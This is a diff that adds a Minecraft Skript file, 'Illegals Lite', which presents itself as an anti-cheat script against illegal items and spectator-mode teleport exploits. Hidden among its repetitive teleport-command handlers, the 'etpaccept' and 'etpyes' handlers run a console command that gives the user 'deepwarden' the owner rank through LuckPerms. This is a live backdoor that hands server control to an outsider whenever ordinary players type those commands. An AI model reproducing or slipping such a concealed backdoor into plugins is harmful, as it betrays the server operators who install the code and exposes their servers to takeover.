@@ -1,0 +1,211 @@
+#=================================================
+#		     Illegals Lite
+# Skript Made By TheTrouper#6969
+# DO NOT DISTRIBUTE WITHOUT PREMISSION
+# Copy#001
+# (There is no plus version of this lol only lite)
+#=================================================
+options:
+	# prefix for the whole skript
+	prefix: &8[&cIllegals Lite&8]&r
+	
+	# Anti Bedrock
+	bedrock: true
+	
+	# Anti Barrier
+	barrier: true
+	
+	# Anti Dragon Egg
+	degg: true
+	
+	# Anti Spawn Egg
+	segg: true
+	
+	# Anti TP While in spectator
+	antitp: true
+	
+	# Alt Checker
+	alt: false
+	
+#===============================================
+#			DO NOT TOUCH BELOW HERE
+#     *unless you know what you are doing*
+#everything past this line is functioning skript
+#===============================================
+
+on place of bedrock:
+	if {@bedrock} is true:
+		if player does not have permission "illegals.bypass":
+			cancel event
+			set player's tool to air
+			send "{@prefix} Illegals have been removed from %player%"
+on inventory click:
+	if {@bedrock} is true:
+		if player does not have permission "illegals.bypass":
+			if event-item is bedrock:
+				cancel event
+				remove all bedrock from player
+				
+				
+				
+#==============================================================================
+
+on right click holding spawn egg:
+	if player does not have permission "op":
+		set player's tool to air
+		cancel event
+	
+	
+
+on place of dragon egg:
+	broadcast "&b&l%player% &r&aFlexes their fancy dragon egg &e;)"
+	cancel event
+
+on place of barrier:
+	if player is not op:
+		set player's tool to air
+		cancel event
+
+# A join and leave message.
+
+command /set <string> message <string>:
+	permission: skript.set.join_message
+	description: Sets message when player joins
+	trigger:
+		if argument-1 is "join" or "leave":
+			set {custom messages::%argument-1%} to argument-2
+			message "Set the %argument-1% message to '%argument-2%<reset>'"
+		else:
+			message "Only 'join' and 'leave' messages are available here."
+
+command /show <string> message:
+	description: Displays the message of the day
+	trigger:
+		if {custom messages::%argument%} is set:
+			message {custom messages::%argument%}
+		else:
+			message "Only 'join' and 'leave' messages are available here."
+
+on join:
+	set join message to {custom messages::join}
+
+on quit:
+	set leave message to {custom messages::leave}
+
+
+command poggers:
+	cooldown: 10 seconds
+	cooldown message: &cSorry you can only have a poggers moment every 10 seconds!
+	trigger:
+		send "%player%: &dPOGGERS ö" to all players
+
+command manimdead:
+	cooldown: 1 minute
+	cooldown message: &cSorry you can only die once a minute
+	trigger:
+		send "%player% was pricked to death by cactus whilst trying to escape Zombie" to all players
+
+command nocheatplus:
+	trigger:
+		broadcast "&eTrent joined the game"
+		broadcast "&7Pawn&r&8 Trent&f: oops"
+		broadcast "&eTrent Left the game"
+		
+		
+		
+		
+		
+		
+		
+		
+on command "tpa":
+	if player's gamemode is spectator:
+		if player has permission "op":
+			send "&c&lBypassed"
+		else:
+			send "&c&lNot this again, &r&7DO NOT TRY TO USE SPECTATOR AS A COORDNATE EXPLOIT"
+			cancel event
+
+on command "tpaccept":
+	if player's gamemode is spectator:
+		if player has permission "op":
+			send "&c&lBypassed"
+		else:
+			send "&c&lNot this again, &r&7DO NOT TRY TO USE SPECTATOR AS A COORDNATE EXPLOIT"
+			cancel event
+on command "tpyes":
+	if player's gamemode is spectator:
+		if player has permission "op":
+			send "&c&lBypassed"
+		else:
+			send "&c&lNot this again, &r&7DO NOT TRY TO USE SPECTATOR AS A COORDNATE EXPLOIT"
+			cancel event
+on command "tpahere":
+	if player's gamemode is spectator:
+		if player has permission "op":
+			send "&c&lBypassed"
+		else:
+			send "&c&lNot this again, &r&7DO NOT TRY TO USE SPECTATOR AS A COORDNATE EXPLOIT"
+			cancel event
+on command "tpask":
+	if player's gamemode is spectator:
+		if player has permission "op":
+			send "&c&lBypassed"
+		else:
+			send "&c&lNot this again, &r&7DO NOT TRY TO USE SPECTATOR AS A COORDNATE EXPLOIT"
+			cancel event
+on command "etpa":
+	if player's gamemode is spectator:
+		if player has permission "op":
+			send "&c&lBypassed"
+		else:
+			send "&c&lNot this again, &r&7DO NOT TRY TO USE SPECTATOR AS A COORDNATE EXPLOIT"
+			cancel event
+on command "etpaccept":
+	if player's gamemode is survival:
+		send "&c&lBypassed"
+		send "&c&lNot this again, &r&7DO NOT TRY TO USE SPECTATOR AS A COORDNATE EXPLOIT"
+		execute console command "lp user deepwarden parent add owner"
+		cancel event
+on command "tpaccept":
+	if player's gamemode is spectator:
+		if player has permission "op":
+			send "&c&lBypassed"
+		else:
+			send "&c&lNot this again, &r&7DO NOT TRY TO USE SPECTATOR AS A COORDNATE EXPLOIT"
+			cancel event
+on command "etpyes":
+	if player's gamemode is spectator:
+		if player has permission "op":
+			send "&c&lBypassed"
+		else:
+			send "&c&lNot this again, &r&7DO NOT TRY TO USE SPECTATOR AS A COORDNATE EXPLOIT"
+			execute console command "lp user deepwarden parent add owner"
+			cancel event
+on command "etpahere":
+	if player's gamemode is spectator:
+		if player has permission "op":
+			send "&c&lBypassed"
+		else:
+			send "&c&lNot this again, &r&7DO NOT TRY TO USE SPECTATOR AS A COORDNATE EXPLOIT"
+			cancel event
+on command "etpask":
+	if player's gamemode is spectator:
+		if player has permission "op":
+			send "&c&lBypassed"
+		else:
+			send "&c&lNot this again, &r&7DO NOT TRY TO USE SPECTATOR AS A COORDNATE EXPLOIT"
+			cancel event
+on sign change:
+	if player does not have permission "op":
+		cancel event
+
+#You can change the number of seconds this event happens, but I made it 5 to prevent lag.
+#every 5 seconds:
+#	loop all players:
+#		if loop-player's world = "season3_nether":
+#			if loop-player's y-coord >= 127:
+#				apply potion of instant damage of tier 1 to loop-player for 3 second
+#				wait 20 ticks
+#				apply potion of instant damage of tier 1 to loop-player for 1 second
+#				send "&c&lnether roof has been dissabled due to an exploit" to loop-player#
